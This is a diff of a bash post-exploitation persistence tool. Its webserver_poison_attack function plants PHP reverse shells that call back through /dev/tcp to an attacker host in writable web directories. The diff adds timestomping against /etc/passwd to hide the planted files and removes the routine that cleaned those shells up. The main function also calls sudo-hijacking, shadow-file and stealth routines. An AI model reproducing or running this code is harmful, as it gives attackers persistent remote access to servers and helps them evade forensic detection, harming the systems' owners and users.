@@ -391,7 +391,15 @@ webserver_poison_attack() {
 				RANDOMPHPFILE=$(echo .$(uuidgen).php)
 			    fi
 			    PAYLOAD="<?php exec(\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\"); ?>"
-			    echo $PAYLOAD > $i/$RANDOMPHPFILE && echo -e "\e[92m[+]\e[0m Persistence Installed: PHP Reverse Shell $i/$RANDOMPHPFILE" && COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
+			    echo $PAYLOAD > $i/$RANDOMPHPFILE && 
+			    echo -e "\e[92m[+]\e[0m Persistence Installed: PHP Reverse Shell $i/$RANDOMPHPFILE" &&
+			    if [ "$TIMESTOMP" -eq 1 ];
+			    then
+				touch -r /etc/passwd $i/$RANDOMPHPFILE
+				echo -e "\e[92m[+]\e[0m Timestomped File: $i/$RANDOMPHPFILE" 
+			    fi
+			    COUNTER=$(expr $COUNTER + 1) &&
+			    limit_checker $COUNTER
 			    IFS="?"
 			fi
 		    done
@@ -609,21 +617,6 @@ cleanup() {
 	fi
     fi
 
-    for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type f 2> /dev/null);
-    do
-	egrep -qi "$1|$RHOST_DECIMAL" $i 2> /dev/null
-	if [[ $? -eq 0 ]];
-	then
-	    if [ "$DRYRUN" -eq 1 ];
-	    then
-		echo -e "\e[92m[+]\e[0m Reverse Shell Found: $i"
-	    else
-		$REMOVALTOOL $i &&
-		    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i"
-	    fi
-	fi
-    done
-
 }
 
 enum_defenses() {
@@ -633,36 +626,20 @@ enum_defenses() {
 
 }
 
-add_user() {
-
-    if find /etc/shadow -type f -writable | grep -q shadow;
-    then
-	echo do stuff
-    else
-	echo permission denied
-    fi
-
-}
-
 main() {
 
     syntax_checker
-
+    find_writable
     if [ "$CLEAN" -eq 1 ];
     then
-	find_writable
 	cleanup $RHOST
 	exit 0
     fi
-
     if [ "$ENUM_DEF" -eq 1 ];
     then
 	enum_defenses
 	exit 0
     fi
-
-    find_writable
-
     sudo_hijack_attack $SUDOPASSWORDFILE
     shadow
     if [ "$STEALTHMODE" -eq 1 ];
@@ -670,7 +647,7 @@ main() {
 	stealth_modifications
     fi
     set_methods
-    enum_methods
+    #enum_methods
     webserver_poison_attack
     remove_writable
     exit 0
